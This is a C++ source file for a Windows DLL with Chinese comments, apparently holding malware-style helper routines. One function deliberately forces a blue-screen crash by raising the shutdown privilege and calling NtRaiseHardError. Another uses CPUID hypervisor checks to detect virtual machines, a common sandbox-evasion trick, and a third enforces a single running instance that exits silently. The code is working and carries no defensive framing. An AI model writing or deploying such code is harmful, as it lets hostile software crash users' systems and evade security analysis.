// Detect.cpp : 定义 DLL 应用程序的导出函数。
//

#include "stdafx.h"
#include "Detect.h"

int g_nIsFirstLaunch = NULL;

// 抛出系统异常并蓝屏;
bool WINAPI CreateSystemError(void)
{
	int status = 0;
	HINSTANCE hNtdllInstance = GetModuleHandle(TEXT("ntdll.dll"));
	if (hNtdllInstance == NULL)
	{
		return FALSE;
	}
	NTSTATUS (NTAPI *pRtlAdjustPrivilege) (ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue) = \
		(NTSTATUS (NTAPI *) (ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue))GetProcAddress(hNtdllInstance, "RtlAdjustPrivilege");
	NTSTATUS (NTAPI *pNtRaiseHardError) (LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, \
		PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response) = (NTSTATUS (NTAPI *) (LONG ErrorStatus, ULONG NumberOfParameters, \
		ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response))GetProcAddress(hNtdllInstance, "NtRaiseHardError");
	BYTE bl;
	ULONG Response;
	status = pRtlAdjustPrivilege(19, TRUE, FALSE, &bl);
	if (!NT_SUCCESS(status))
	{
		return FALSE;
	}
	status = pNtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); 
	if (!NT_SUCCESS(status))
	{
		return FALSE;
	}

	return TRUE;
}

// 检测当前进程是否在虚拟机中运行;
bool WINAPI AntiVMWare(void)
{
	int cpu_info[4];
	__cpuid(cpu_info, 1);
	if ((cpu_info[2]>>31) & 1)
	{
		cpu_info[1] = 0;
		cpu_info[2] = 0;
		cpu_info[3] = 0;
		__cpuid(cpu_info, 0x40000000);
		if (cpu_info[1] == 0x7263694d && cpu_info[2] == 0x666f736f && cpu_info[3] == 0x76482074)
		{
			cpu_info[1] = 0;
			__cpuid(cpu_info, 0x40000003);
			if (cpu_info[1] & 1)
			{
				return FALSE;
			}
		}

		return TRUE;
	}

	return 0;
}

// 检测是否当前程序仅被启动了一次;
bool WINAPI PreventDuplicateLaunch(PTCHAR pzsFlag)
{
	if (g_nIsFirstLaunch++ != NULL)
	{
		return TRUE;
	}
	HANDLE hMutex = OpenMutex(MUTEX_ALL_ACCESS, FALSE, pzsFlag);
	if (hMutex != NULL)
	{
		CloseHandle(hMutex);
		ExitProcess(0);
	}
	if (!CreateMutex(NULL, FALSE, pzsFlag))
	{
		return FALSE;
	}

	return TRUE;
}